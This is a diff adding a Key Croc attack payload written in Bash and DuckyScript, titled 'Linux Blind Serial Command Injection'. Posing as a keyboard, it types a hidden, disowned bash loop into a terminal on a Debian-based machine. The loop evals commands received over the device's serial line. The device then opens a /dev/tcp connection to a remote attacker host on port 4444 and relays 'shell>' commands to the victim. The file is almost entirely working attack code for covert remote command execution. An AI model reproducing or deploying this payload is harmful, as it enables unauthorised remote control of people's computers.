@@ -1,0 +1,124 @@
+#!/bin/bash
+#
+# Title:            "Linux" Blind Serial Command Injection
+# Description:
+#                   Allows a remote attacker to execute commands on a Linux system 
+#                   via a serial connection, without receiving feedback 
+#                   on the results of the commands.
+#
+# Author:           TW-D
+# Version:          1.0
+# Target:           Debian-Based Linux Distributions
+# Category:         Remote Access
+# Attackmodes:      HID then SERIAL
+#
+# TESTED ON
+# ===============
+# Key Croc 1.4-stable and Ubuntu 22.04.4 LTS
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## TRIGGER ########
+
+#
+# Not applicable because of matchless payload
+#
+
+######## INITIALIZATION ########
+
+readonly REMOTE_HOST="192.168.0.X"
+readonly REMOTE_PORT="4444"
+readonly LOCAL_TTY="/dev/ttyGS0"
+
+######## SETUP ########
+
+LED SETUP
+
+export DUCKY_LANG="us"
+
+######## ATTACK ########
+
+LED ATTACK
+
+ATTACKMODE HID
+
+QUACK CTRL-ALT t
+QUACK DELAY 1500
+QUACK STRING " nohup \"\${BASH}\" -c '"
+QUACK STRING "if groups \"\${USER}\" | grep -qw \"dialout\"; then"
+QUACK STRING " default_devices=\"\$(ls /dev/tty* 2> /dev/null)\";"
+QUACK STRING " key_croc=\"\";"
+QUACK STRING " while true; do"
+QUACK STRING " current_devices=\"\$(ls /dev/tty* 2> /dev/null)\";"
+QUACK STRING " while IFS= read -r device; do"
+QUACK STRING " if ! grep -qF \"\${device}\" <<< \"\${default_devices}\"; then"
+QUACK STRING " key_croc=\"\${device}\";"
+QUACK STRING " break 2;"
+QUACK STRING " fi;"
+QUACK STRING " done <<< \"\${current_devices}\";"
+QUACK STRING " sleep 1;"
+QUACK STRING " done;"
+QUACK STRING " while IFS= read -r line; do"
+QUACK STRING " if [[ -n \"\${line}\" ]]; then"
+QUACK STRING " payload=\$(echo \"\${line}\" | grep -oP \"(?<=<payload>).*?(?=</payload>)\");"
+QUACK STRING " if [[ -n \"\${payload}\" ]]; then"
+QUACK STRING " eval \"\${payload}\";"
+QUACK STRING " fi;"
+QUACK STRING " fi;"
+QUACK STRING " done < \"\${key_croc}\";"
+QUACK STRING " fi"
+QUACK STRING "' &> /dev/null &"
+QUACK DELAY 250
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING " disown && exit"
+QUACK DELAY 250
+QUACK ENTER
+
+######## STAGE2 ########
+
+LED STAGE2
+
+ATTACKMODE SERIAL
+
+if [ -e "${LOCAL_TTY}" ]; then
+    exec 3<>/dev/tcp/${REMOTE_HOST}/${REMOTE_PORT}
+    while true; do
+        if echo -n "shell> " >&3; then
+            if read -r payload <&3; then
+                echo "<payload>${payload}</payload>" > "${LOCAL_TTY}"
+            else
+                break
+            fi
+        else
+            break     
+        fi
+    done
+    exec 3<&-
+    exec 3>&-
+fi
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+
+######## FINISH ########
+
+LED FINISH
+
+ATTACKMODE OFF
+
+######## OFF ########
+
+LED OFF
+
+shutdown -h now
